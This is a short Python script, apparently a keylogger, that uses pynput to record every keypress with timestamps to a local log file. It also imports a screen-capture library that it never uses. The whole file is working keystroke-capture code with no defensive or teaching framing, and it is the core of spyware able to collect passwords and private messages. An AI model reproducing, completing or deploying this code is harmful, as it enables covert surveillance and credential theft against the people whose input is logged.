import os
import logging
from pynput import keyboard
from PIL import ImageGrab
import time

# Logging configuration
logging.basicConfig(filename='logs/activity.log', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()


if __name__ == "__main__":
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    start_keylogger()
